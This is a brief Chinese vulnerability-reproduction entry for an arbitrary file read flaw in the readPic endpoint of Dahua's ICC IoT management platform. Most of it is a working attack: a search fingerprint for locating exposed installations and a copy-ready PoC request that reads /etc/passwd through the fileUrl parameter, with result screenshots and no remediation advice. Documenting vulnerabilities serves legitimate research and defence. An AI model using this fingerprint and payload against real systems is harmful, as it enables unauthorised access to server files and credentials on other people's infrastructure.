---
title: "大华 ICC智能物联综合管理平台 readPic 任意文件读取漏洞"
date: 2026-10-18 09:15:57
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "大华"
tags:
  - "大华"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

大化 ICC智能物联综合管理平台 readPic 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 漏洞影响

大华 ICC智能物联综合管理平台

## 网络测绘

```
body="*客户端会小于800*"
```

## 漏洞复现

登陆页面

![image-20231116141833821](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231116141833821.png)

poc

```
/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
```

![image-20231116141852063](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231116141852063.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%A4%A7%E5%8D%8E-ICC%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readPic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
